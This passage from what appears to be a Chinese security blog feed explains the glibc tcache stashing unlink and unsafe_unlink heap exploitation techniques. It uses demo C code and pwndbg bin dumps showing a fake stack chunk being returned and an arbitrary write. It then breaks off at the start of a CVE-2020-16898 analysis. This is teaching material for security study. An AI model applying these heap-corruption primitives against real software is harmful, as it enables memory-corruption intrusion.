class="number">0x7fffea457230</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457240</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>首先让我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择stack_var[2]的地址作为fake bk。之后我们可以看到*(fake_chunk-&gt;bk + 0x10)，也就是stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br></pre></td></tr></table></figure><p>free 7 个chunk，填满 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">  <span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">  <span class="number">38</span>     &#125;</span><br><span class="line">  <span class="number">39</span></span><br><span class="line">► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">41</span></span><br><span class="line">  <span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line">  <span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这个我们注意一下， tcache bin 的最后一个bin是  chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"> ► <span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">47</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x55a4674bc340</span> —▸ <span class="number">0x55a4674bc7a0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">50</span></span><br><span class="line">  <span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时，我们假设有一个漏洞能修改 chunklis[2]的 bck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">  <span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">► <span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">  <span class="number">65</span></span><br></pre></td></tr></table></figure><p>此时 bins 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">BK: <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x7fffea4571c0</span> —▸ <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们 calloc 一个新 chunk ，此时将 chunk[0] (calloc 不会从 tcache 取)</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc700</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_stashing_unlink_attack.c</span><br><span class="line">   <span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">   <span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">   <span class="number">77</span></span><br><span class="line">   <span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">80</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffea4571b0</span> ◂— <span class="number">0x900000009</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffea4571b8</span> —▸ <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffea4571c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rax r8  <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fffea4571d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffea4571e0</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) —▸ <span class="number">0x7fd3f030cc60</span> (main_arena+<span class="number">224</span>) —▸ <span class="number">0x7fd3f030cc50</span> (main_arena+<span class="number">208</span>) —▸ <span class="number">0x7fd3f030cc40</span> (main_arena+<span class="number">192</span>) ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffea4571e8</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>a466c59494 main+<span class="number">619</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>d3f01480b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffea4571d0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h3><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">  <span class="number">18</span> <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">► <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span></span><br><span class="line">  <span class="number">22</span> chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">  <span class="number">23</span> <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p>然后我们需要在堆上伪造一个 chunk （ 我们设置我们的假块大小，这样就可以绕过<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f%E4%B8%AD%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%A3%80%E6%9F%A5%E3%80%82">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f中介绍的检查。</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">29</span> chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">  <span class="number">30</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">► <span class="number">31</span> chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">  <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">  <span class="number">33</span> <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">  <span class="number">34</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>我们设置好 size ， fd ，bk 以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x56540553d2a0</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0x56540553d280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span>         -&gt; chunk0_ptr</span><br><span class="line"><span class="number">0x56540553d2a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span>         -&gt; fake chunk</span><br><span class="line"><span class="number">0x56540553d2b0</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x0000565403b5b010</span></span><br><span class="line"><span class="number">0x56540553d2c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d2d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们假设我们在chunk0中有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改 chunk1 的preve size  和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)== False</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/unsafe_unlink.c</span><br><span class="line">   <span class="number">42</span> chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="number">43</span> <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">44</span> <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   <span class="number">45</span> chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">   <span class="number">46</span></span><br><span class="line"> ► <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x430</span></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x56540553d6c0</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x420</span></span><br><span class="line">size : <span class="number">0x430</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">fd_nextsize : <span class="number">0x0</span></span><br><span class="line">bk_nextsize : <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>此时就会判断 chunk0 为 free 状态，然后我们free chunk1_ptr 就会发生 unlink, unlink fake chunk的链接，覆盖chunk0_ptr</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">23</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b008</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x00007f8ca43e66a0</span></span><br><span class="line"><span class="number">0x565403b5b018</span> &lt;completed&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b028</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">   <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">   <span class="number">55</span></span><br><span class="line"> ► <span class="number">56</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">24</span> = <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">25</span> = <span class="number">0x7f8ca42210b3</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">58</span> chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"> ► <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Heap" scheme="https://bestwing.me/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-16898 &quot;Bad Neighbor&quot; 分析</title>
    <link href="https://bestwing.me/CVE-2020-15898-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-15898-analysis.html</id>
    <published>2020-10-19T16:00:00.000Z</published>
    <updated>2020-10-21T02:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年10月14日，微软修复了一个紧急漏洞：Windows TCP/IP 远程代码执行漏洞，漏洞编号为 CVE-2020-16898。</p><p>从14 号公开的信息可以得知，这是一个与 ipv6 协议有关，漏洞类型为栈溢出的漏洞。</p><h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><p>通过公开信息</p><blockquote><p>A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even. In this Option, the length is counted in increments of 8 bytes, so an RDNSS option with a length of 3 should have a total length of 24 bytes. The option itself consists of five fields: Type, Length, Reserved, Lifetime, and Addresses of IPv6 Recursive DNS Servers. The first four fields always total 8 bytes, but the last field can contain a variable number of IPv6 addresses, which are 16 bytes each. As a result, the length field should always be an odd value of at least 3, per <a 